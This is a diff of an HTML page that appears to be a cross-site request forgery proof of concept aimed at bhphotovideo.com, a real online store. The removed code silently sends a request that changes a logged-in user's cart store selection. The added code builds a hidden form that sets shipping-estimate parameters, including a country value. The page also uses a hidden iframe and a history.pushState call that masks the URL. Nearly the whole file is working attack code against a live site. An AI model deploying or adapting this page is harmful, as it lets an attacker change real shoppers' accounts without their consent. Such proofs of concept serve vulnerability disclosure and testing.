@@ -6,13 +6,7 @@
   integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
   crossorigin="anonymous"></script>
   <script>
-	  jQuery(window).load(function(){
-	  	jQuery.ajax("https://www.bhphotovideo.com/bnh/controller/home?Q=json&O=&A=selectStore&stage=checkout&json=Y&location=store",
-			    {
-			success: function(data){alert('successfully updated users cart selection')},
-			error: function(){alert('an error occurred')}
-		});
-	  });
+	  
 	function doJob(){
 		var child = window.open("https://www.bhphotovideo.com");
          setTimeout(function() {
@@ -28,13 +22,13 @@
 		
    <script>history.pushState('', '', '/')</script>
 	<iframe name="votar" style="display:none;"></iframe>
-    <form id="myForm" action="https://www.bhphotovideo.com/bnh/controller/home">
+     <form action="https://www.bhphotovideo.com/bnh/controller/home">
       <input type="hidden" name="Q" value="json" />
       <input type="hidden" name="O" value="" />
-      <input type="hidden" name="A" value="selectStore" />
-      <input type="hidden" name="stage" value="checkout" />
-      <input type="hidden" name="json" value="Y" />
-      <input type="hidden" name="location" value="store" />
+      <input type="hidden" name="A" value="estimateShippingMethods" />
+      <input type="hidden" name="show" value="all" />
+      <input type="hidden" name="mergePackages" value="false" />
+      <input type="hidden" name="cartCountry" value="AF" />
       <input type="submit" value="Submit request" />
     </form>
 </body>
